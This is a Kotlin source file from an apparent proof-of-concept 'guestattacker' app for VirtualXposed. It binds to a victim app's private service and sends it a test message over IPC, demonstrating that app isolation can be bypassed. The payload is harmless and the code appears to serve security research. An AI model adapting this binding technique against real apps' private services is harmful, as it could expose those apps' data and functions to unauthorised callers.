package com.virtualxposed.guestattacker

import android.annotation.SuppressLint
import android.content.ComponentName
import android.content.Context
import android.content.Context.BIND_AUTO_CREATE
import android.content.Intent
import android.content.ServiceConnection
import android.os.Handler
import android.os.IBinder
import android.os.IInterface
import com.virtualxposed.guestattacker.StorageBypass.VICTIM_APP
import com.virtualxposed.guestattacker.Utils.log
import com.virtualxposed.guestattacker.Utils.toast
import com.virtualxposed.victim.IPrivateService
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.filterNotNull
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.withTimeoutOrNull
import kotlin.time.Duration.Companion.seconds

object IPC {
    private val privateService = MutableStateFlow<IPrivateService?>(null)

    fun sendMessage(context: Context): Boolean {
        val responseMessage = privateService.value?.sendMessage("Attack message!")
        if (responseMessage == null) {
            toast(context, "No response from Victim app.")
        } else {
            toast(context, "Got response from Victim app: $responseMessage")
        }
        return responseMessage != null
    }

    suspend fun messageVictimApp(context: Context): Boolean {
        val service = privateService
        if (service.value != null) {
            return sendMessage(context)
        }

        val intent = Intent().apply {
            this.setPackage(VICTIM_APP)
            this.setComponent(
                ComponentName(
                    VICTIM_APP, "$VICTIM_APP.PrivateService"
                )
            )
        }

        val connection = object : ServiceConnection {
            override fun onServiceConnected(
                name: ComponentName?, service: IBinder?
            ) {
                privateService.value = IPrivateService.Stub.asInterface(service)
            }

            override fun onServiceDisconnected(name: ComponentName?) {
            }
        }

        runCatching {
            context.bindService(
                 intent, connection, BIND_AUTO_CREATE
            )
        }

        // Wait for 10 seconds to start the service
        withTimeoutOrNull(10.seconds) {
            service.filterNotNull().first()
        }

        return sendMessage(context)
    }
}

